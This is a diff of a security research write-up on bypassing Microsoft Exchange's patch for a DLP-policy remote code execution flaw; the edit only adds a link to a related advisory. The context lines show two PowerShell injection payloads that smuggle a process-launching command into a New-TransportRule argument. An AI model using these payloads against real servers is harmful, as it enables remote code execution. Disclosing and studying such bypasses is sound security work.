@@ -520,7 +520,7 @@ or
 
 `neW-tRaNsPoRtRuLe 360Vulcan; [Diagnostics.Process]::Start("cmd", "/c mspaint") #-dLpPoLiCy`
 
-Well done to [Markus Vervier](https://twitter.com/marver) for discovering that particular patch bypass! The other bypass I found was that it was possible to use powershell [call operators](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7#call-operator-) using the `&` symbol to call powershell cmdlets. By default you can't call cmdlets that require an argument but since we have the statement seperator we could just append the arguments to the variable call as needed!
+Well done to [Markus Vervier](https://twitter.com/marver) for discovering that particular patch bypass which he also [blogged about](https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)! The other bypass I found was that it was possible to use powershell [call operators](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7#call-operator-) using the `&` symbol to call powershell cmdlets. By default you can't call cmdlets that require an argument but since we have the statement seperator we could just append the arguments to the variable call as needed!
 
 `neW-tRaNsPoRtRuLe 360Vulcan; $poc='New-object'; $i = & $poc System.Diagnostics.ProcessStartInfo; $i.UseShellExecute = $true; $i.FileName="cmd"; $i.Arguments="/c mspaint"; $r = & $poc System.Diagnostics.Process; $r.StartInfo = $i; $r.Start() #-dLpPoLiCy`
 
